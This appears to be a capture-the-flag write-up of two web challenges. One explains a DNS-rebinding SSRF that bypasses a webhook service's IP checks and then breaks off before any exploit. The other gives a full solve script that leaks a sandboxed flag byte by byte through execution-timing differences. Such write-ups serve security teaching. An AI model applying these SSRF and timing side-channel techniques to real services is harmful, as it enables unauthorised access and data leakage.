## Webhook Service

**Category**: web

**Description**: I got fed up with using third-party sites to create webhooks, so I decided to build my own! It even works in outer space! Check it out and let me know your thoughts. I'm pretty confident it's the most secure webhook service in the entire universe. Suffering ends in 30 minutes. [http://chall.0xfun.org:36224](http://chall.0xfun.org:36224)

I get the challenge files. Here is the main logic in `app.py`:
```python
import threading
from flask import Flask, request, abort, render_template, jsonify
import requests
from urllib.parse import urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import ipaddress
import uuid

def load_flag():
    with open('flag.txt', 'r') as f:
        return f.read().strip()

FLAG = load_flag()

class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()


# Start internal flag server
threading.Thread(
    target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(),
    daemon=True
).start()

app = Flask(__name__)

registered_webhooks = {}

def create_app():
    return app

@app.route('/')
def index():
    return render_template('index.html')

def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''

    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, 'Could not resolve host'

    ip_obj = ipaddress.ip_address(ip)

    if (
        ip_obj.is_private
        or ip_obj.is_loopback
        or ip_obj.is_link_local
        or ip_obj.is_reserved
    ):
        return False, f'IP "{ip}" not allowed'

    return True, None

@app.route('/register', methods=['POST'])
def register_webhook():
    url = request.form.get('url')

    if not url:
        abort(400, 'Missing url parameter')

    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return reason, 400

    webhook_id = str(uuid.uuid4())
    registered_webhooks[webhook_id] = url

    return jsonify({
        'status': 'registered',
        'url': url,
        'id': webhook_id
    }), 200

@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    webhook_id = request.form.get('id')

    if not webhook_id:
        abort(400, 'Missing webhook id')

    url = registered_webhooks.get(webhook_id)
    if not url:
        return jsonify({'error': 'Webhook not found'}), 404

    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400

    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({
            'url': url,
            'status': resp.status_code,
            'response': resp.text
        }), resp.status_code
    except Exception:
        return jsonify({
            'url': url,
            'error': 'something went wrong'
        }), 500

if __name__ == '__main__':
    print('listening on port 5000')
    app.run(host='0.0.0.0', port=5000)
```
They do `is_ip_allowed(url)` in both `/register` and `/trigger` so DNS is resolved each time. This creates a race condition between the two resolutions. 

I go to [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) to make a dns rebinding url like this: `01020304.ac110001.rbndr.us`.

## Schrödinger's Sandbox

**Category**: web

**Author**: SwitchCaseAdvocate

**Description**: Your code runs in two parallel universes - one with the real flag, one with a fake. You only see the output if both universes agree. But even quantum mechanics can't hide everything... Suffering ends in 30 minutes. [http://chall.0xfun.org:29944](http://chall.0xfun.org:29944)

I go to the site:

![Alt text](/images/Schrodingers-Sandbox.png)

The server runs the python code in two different sandboxes and compares `stdout` and `stderr`. It will only show output if they match. Sandbox `a` contains the real flag and sandbox `b` has a fake flag so obviously they will never match. It returns execution times for each sandbox  and the delta (difference between them) so we need to rely on this. This creates a timing side channel attack.

Solve script:
```python
import hashlib
import json
import random
import time as time_mod
import requests

URL = "http://chall.0xfun.org:29944"
API_ENDPOINT = f"{URL}/api/submit"
BASE_TIME = 0.00835    # From calibration: average of 0.0083 and 0.0084
SLEEP_PER_CHAR = 0.05  # For length leak
SLEEP_PER_BYTE = 0.01  # For byte leak
EXPECTED_LEN = 41      # From length leak
DIFFICULTY = 4         # PoW leading zeros

def compute_pow(difficulty=DIFFICULTY):
    """Compute proof-of-work: find nonce where SHA256(test) starts with '0'*difficulty"""
    target = '0' * difficulty
    nonce = 0
    while True:
        timestamp = int(time_mod.time() * 1000)
        rand_val = random.random()
        test = f"{timestamp}-{nonce}-{rand_val}"
        # Compute SHA256
        hash_obj = hashlib.sha256(test.encode('utf-8'))
        hex_hash = hash_obj.hexdigest()
        if hex_hash.startswith(target):
            return test
        nonce += 1
        # Yield occasionally to not block too hard
        if nonce % 10000 == 0:
            time_mod.sleep(0.001)

def submit_code(code):
    """Submit code to server and return response data"""
    pow_solution = compute_pow()
    headers = {
        'Content-Type': 'application/json',
        'X-Pow-Nonce': pow_solution
    }
    payload = {'code': code}
    response = requests.post(API_ENDPOINT, headers=headers, json=payload)
    response.raise_for_status()
    data = response.json()
    if 'error' in data:
        raise ValueError(f"Server error: {data['error']}")
    return data

def leak_length(base_time):
    """Run length leak (optional, if not known)"""
    code = f"""import time
flag = open("/flag.txt").read().strip()
time.sleep(len(flag) * {SLEEP_PER_CHAR})
print("done")"""
    data = submit_code(code)
    time_a = data['time_a']
    time_b = data['time_b']
    len_a = round((time_a - base_time) / SLEEP_PER_CHAR)
    len_b = round((time_b - base_time) / SLEEP_PER_CHAR)
    max_len = max(len_a, len_b)
    print(f"Leaked lengths: A={len_a}, B={len_b}, using max={max_len}")
    return max_len

def leak_bytes(base_time, max_len):
    """Leak byte values position by position"""
    bytes_a = []
    bytes_b = []
    for i in range(max_len):
        code = f"""import time
flag = open("/flag.txt").read().strip()
byte_val = ord(flag[{i}]) if {i} < len(flag) else 0
time.sleep(byte_val * {SLEEP_PER_BYTE})
print("done")"""
        print(f"Leaking position {i}...")
        data = submit_code(code)
        time_a = data['time_a']
        time_b = data['time_b']
        byte_a = round((time_a - base_time) / SLEEP_PER_BYTE)
        byte_b = round((time_b - base_time) / SLEEP_PER_BYTE)
        bytes_a.append(byte_a)
        bytes_b.append(byte_b)
        print(f"  Pos {i}: A={byte_a} ('{chr(byte_a) if 32 <= byte_a <= 126 else '?' }'), B={byte_b} ('{chr(byte_b) if 32 <= byte_b <= 126 else '?' }')")
    return bytes_a, bytes_b

def reconstruct_flag(bytes_list):
    """Reconstruct flag string from byte list"""
    return ''.join(chr(b) for b in bytes_list)

def main(calibrate=False, known_len=None):
    if calibrate:
        # Run calibration
        code_calib = """flag = open("/flag.txt").read()
print("calibrated")"""
        print("Running calibration...")
        data = submit_code(code_calib)
        time_a = data['time_a']
        time_b = data['time_b']
        base_time = (time_a + time_b) / 2
        print(f"Calibrated base time: {base_time:.4f}s (A={time_a:.4f}, B={time_b:.4f})")
    else:
        base_time = BASE_TIME

    if known_len is None:
        max_len = leak_length(base_time)
    else:
        max_len = known_len

    bytes_a, bytes_b = leak_bytes(base_time, max_len)

    flag_a = reconstruct_flag(bytes_a)
    flag_b = reconstruct_flag(bytes_b)

    print("Sandbox A:", repr(flag_a))
```
